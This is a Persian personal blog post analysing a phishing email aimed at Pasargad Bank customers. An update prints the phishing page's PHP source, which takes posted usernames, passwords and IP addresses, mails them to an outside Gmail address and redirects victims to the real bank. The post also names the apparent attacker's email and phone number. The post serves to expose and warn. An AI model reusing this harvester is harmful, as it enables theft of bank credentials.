---
id: 732
title: 'فیشینگ بانک پاسارگاد &#8211; پیدا کردن هکر'
date: 2015-07-08T10:07:47+00:00
author: امیر کریمی
layout: post
guid: https://dev-frame.amirkarimi.me/?p=732
permalink: '/2015/07/%d9%81%db%8c%d8%b4%db%8c%d9%86%da%af-%d8%a8%d8%a7%d9%86%da%a9-%d9%be%d8%a7%d8%b3%d8%a7%d8%b1%da%af%d8%a7%d8%af/'
views:
  - "2882"
categories:
  - فناوری
  - متفرقه
tags:
  - Security
  - امنیت
---
یه ایمیل برام اومد که با یه روش قدیمی و شناخته شده سعی در هک کردن اکانت حساب بانکی پاسارگادم داره؛ فیشینگ (Phishing).

<a href="/wp-content/uploads/2015/07/pishing_pasargad.jpeg" target="_blank"><img class="aligncenter wp-image-733 size-medium" src="/wp-content/uploads/2015/07/pishing_pasargad-300x148.jpeg" alt="pishing_pasargad" width="300" height="148" srcset="/wp-content/uploads/2015/07/pishing_pasargad-300x148.jpeg 300w, /wp-content/uploads/2015/07/pishing_pasargad.jpeg 728w" sizes="(max-width: 300px) 100vw, 300px" /></a>

همنوطور که تو تصویر بالا قابل مشاهده هست لینک داخل ایمیل در ظاهر دقیقا لینک دسترسی به اینترنت بانک پاسارگاد هست ولی در باطن لینک شده به یه سایت دیگه که دقیقا عین سایت اصلی ساخته شده فقط هرچی توی فیلدهای این صفحه بنویسیم (شامل نام کاربری و کلمه عبور) رو برای هکر میفرسته و بعد هم صفحه اصلی بانک رو نشون میده تا یه وقت به چیزی شک نکنیم و فکر کنیم که احتمالا خودمون فیلدی رو اشتباه وارد کردیم. با یه مهندسی اجتماعی ساده (اینکه کسی ۶ میلیون تومن پول ریخته به حسابمون) هم سعی کرده تحریکمون کنه که حتما لاگین کنیم.

<a href="/wp-content/uploads/2015/07/pishing_pasargad_2.jpeg" target="_blank"><img class="aligncenter size-medium wp-image-734" src="/wp-content/uploads/2015/07/pishing_pasargad_2-300x232.jpeg" alt="pishing_pasargad_2" width="300" height="232" srcset="/wp-content/uploads/2015/07/pishing_pasargad_2-300x232.jpeg 300w, /wp-content/uploads/2015/07/pishing_pasargad_2.jpeg 674w" sizes="(max-width: 300px) 100vw, 300px" /></a>

جالب اینجاست که این هک برای انگلیسی زبان‌ها ساخته شده و درگاه پرداخت اصلی هم به زبان انگلیسی هست.

خوشبختانه هم خود Thunderbird تشخیص داد که این ایمیل جعلی هست و هم وقتی روی لینک کلیک میکنیم یه پیغام میده که ظاهر این لینک با آدرسی که بهش اشاره کرده نمی‌خونه ولی اگر هکر یه کم حرفه‌ای‌تر بود میتونست کاری کنه که ایمیل اسپم نشه و این هشدار هم داده نشه. به هر حال من شک ندارم حداقل ۸۰ درصد مردم متوجه هیچ کدوم از این مسائل نمی‌شن و نام کاربری و کلمه عبورشون رو برای هکر میفرستن! متاسفانه، به همین راحتی.

### به روز رسانی

خوشبختانه مثل اینکه این هکر ما یه مقداری ناشی هست. اگر به مسیر روت سایت فیشینگ برید میبیند که Directory Listing سرور رو نبسته و از اون بدتر نسخه zip شده سایت رو هم گذاشته روی سرور این یعنی سورس این صفحه در دسترس هست. کد PHP این صفحه فیشینگ به شکل زیره:

<pre class="brush: php; title: ; notranslate" title="">&lt;?php  
$ip = getenv("REMOTE_ADDR");  

$message .= "--------------INFORMATION-------------------\n"; 
$message .= "User: ".$_POST['username']."\n"; 
$message .= "Pass: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n"; 
$message .= "---------------Created By Kizito +6289524438862--------------------\n"; 

$send = "kizito.bank@gmail.com"; 
$subject = "Pasargad"; 
$headers = "From:  iben.bpi.ir"; 
mail($send,$subject,$message,$headers); 

header("Location: https://iben.bpi.ir/");  
?&gt; 
</pre>

همونطور که مشخصه ایمیلی که اطلاعات قربانی‌ها براش ارسال میشه kizito.bank@gmail.com هست و البته برنامه‌نویس یه تلفن هم گذاشته (که مال اندونزی هست)! یه سناریو میتونه این باشه که یه آدم غیر فنی سفارش این هک رو به یه فریلنسر داده و ازش تحویل گرفته ولی موقعه بارگذاری چون مسائل امنیتی رو نمی‌دونسته اینطوری کدها رو در معرض دید عموم قرارداده. این برنامه‌نویس کلاه سیاه هم تلفنش رو گذاشته بوده واسه تبلیغ تا در انتهای هر ایمیل که برای کارفرما ارسال میشه در پایین نام کاربری و کلمه عبور قربانی‌ها بیاد. به قول معروف امضاء خودش رو اونجا گذاشته.